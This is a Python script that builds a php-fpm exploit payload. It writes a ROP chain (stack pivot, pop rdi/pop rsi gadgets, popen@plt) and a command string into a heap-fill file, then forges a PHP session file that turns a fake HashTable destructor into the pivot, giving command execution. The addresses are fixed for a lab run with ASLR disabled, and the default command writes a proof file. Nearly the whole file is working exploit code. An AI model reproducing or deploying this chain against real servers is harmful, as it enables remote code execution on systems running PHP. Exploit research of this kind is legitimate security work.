#!/usr/bin/env python3
"""Build the FPM B payload for the pivot+popen ROP variant.

Takes the calibrated fillU.bin (d/HT/entries/arHash layout) and replaces the
zif_system execute_data frame at d+0xE00 with the php-fpm pivot buffer and ROP
stack, plus a raw command string at d+0xF00 and "r" at d+0xF20. The session
file sets the last variable (e) to the pivot, so the fake HashTable
pDestructor becomes the pivot.

php-fpm 8.5.11 gadgets (base 0x555555400000 under setarch -R):
  pivot   0x6bdd0e  mov %rdi,%rsp; restore; jmp *0x40(%rsp)
  pop rdi 0x20a7e8  pop %rdi; ret
  pop rsi 0x209149  pop %rsi; ret
  ret     0x20a7e9
  popen   0x202e50  popen@plt
"""
import argparse
import struct

D = 0x7ffff63b9000
BASE_OFF = 0xFE8
BASE = 0x555555400000

PIVOT = BASE + 0x6BDD0E
POP_RDI = BASE + 0x20A7E8
POP_RSI = BASE + 0x209149
RET = BASE + 0x20A7E9
POPEN = BASE + 0x202E50


def wq(buf, off, value):
    buf[off:off + 8] = struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--fill", default="payload/fillU.bin")
    ap.add_argument("--out-fill", default="payload/fillU_rop.bin")
    ap.add_argument("--out-sess", default="payload/sess_rop")
    ap.add_argument("--cmd", default="id > /tmp/fpm_rop_proof")
    a = ap.parse_args()
    buf = bytearray(open(a.fill, "rb").read())
    off = lambda x: BASE_OFF + x  # noqa: E731

    wq(buf, off(0xE00), 0x0000037F00001F80)  # MXCSR 0x1F80, fldcw 0x037F
    wq(buf, off(0xE08), 1)                   # zval type: IS_NULL, not UNDEF
    for x in range(0xE10, 0xE40, 8):         # r12-rbp
        wq(buf, off(x), 0)
    wq(buf, off(0xE40), POP_RDI)             # jmp target
    wq(buf, off(0xE48), D + 0xF00)           # command C string
    wq(buf, off(0xE50), POP_RSI)
    wq(buf, off(0xE58), D + 0xF20)           # "r"; also bucket 2 key
    wq(buf, off(0xE60), RET)
    wq(buf, off(0xE68), POPEN)
    wq(buf, off(0xE70), 0)
    wq(buf, off(0xE78), 0)
    cmd = a.cmd.encode() + b"\0"
    buf[off(0xF00):off(0xF00) + len(cmd)] = cmd
    buf[off(0xF20):off(0xF20) + 2] = b"r\0"
    open(a.out_fill, "wb").write(bytes(buf))

    e = PIVOT
    sess = ("a|i:%d;b|i:%d;c|i:%d;d|i:256;e|i:%d;" %
            (D + 0x38, D + 0x908, D + 0xE00, e)).encode()
    open(a.out_sess, "wb").write(sess)
    print("fill=%s (%d bytes) sess=%s" % (a.out_fill, len(buf), sess.decode()))
    print("pivot=0x%x pop_rdi=0x%x pop_rsi=0x%x ret=0x%x popen=0x%x" % (
        PIVOT, POP_RDI, POP_RSI, RET, POPEN))
    print("cmd=%r" % cmd)


if __name__ == "__main__":
    main()
